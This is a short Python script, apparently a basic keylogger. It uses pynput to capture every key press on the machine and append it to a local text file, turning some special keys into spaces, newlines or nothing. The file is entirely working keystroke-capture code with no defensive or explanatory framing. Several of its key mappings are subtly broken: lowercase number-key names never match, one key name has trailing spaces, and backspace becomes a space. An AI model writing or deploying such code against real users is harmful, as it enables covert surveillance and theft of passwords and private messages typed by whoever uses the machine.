
from pynput.keyboard import Listener
import pyautogui



def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")
#Keystroke program
    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift_r':
        letter = ''
    if letter == "Key.ctrl_l":
        letter = ""
    if letter == "Key.enter":
        letter = "\n"
    if letter == "Key.shift":
        letter = " "
    if letter == "Key.backspace":
        letter = " "
    if letter == "key._1":
        letter = "1"
    if letter == "key._2":
        letter = "2"
    if letter == "key._3":
        letter = "3"
    if letter == "key._4":
        letter = "4"
    if letter == "key._5":
        letter = "5"
    if letter == "key._6":
        letter = "6"
    if letter == "key._7":
        letter = "7"
    if letter == "key._8":
        letter = "8"
    if letter == "key._9":
        letter = "9"
    if letter == "key._0":
        letter = "0"
    if letter == "Key.alt":
        letter = " "
    if letter == "Key.ltab   ":
        letter = " "

    with open("file.txt", 'a') as f:
        f.write(letter)

with Listener(on_press=write_to_file) as l:
    l.join()



